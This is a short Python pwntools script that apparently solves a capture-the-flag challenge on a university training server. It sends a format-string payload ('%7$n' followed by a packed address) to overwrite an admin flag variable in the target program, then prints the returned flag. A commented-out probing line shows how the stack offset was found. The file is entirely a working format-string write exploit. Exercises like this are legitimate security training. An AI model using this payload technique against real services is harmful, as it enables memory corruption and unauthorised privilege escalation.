from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9103

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

admin_address = 0x000000000040408c

conn.recvuntil(b":")
# conn.sendline(b"%AAAAAAAA" + (b" %lx") * 10)
# print(conn.recvline())

conn.sendline(b" " + b"%7$n" + b" " * 3 + p64(admin_address))

conn.recvuntil(b"flag: ")
flag = conn.recvline(keepends=False).decode()
conn.close()
print(flag)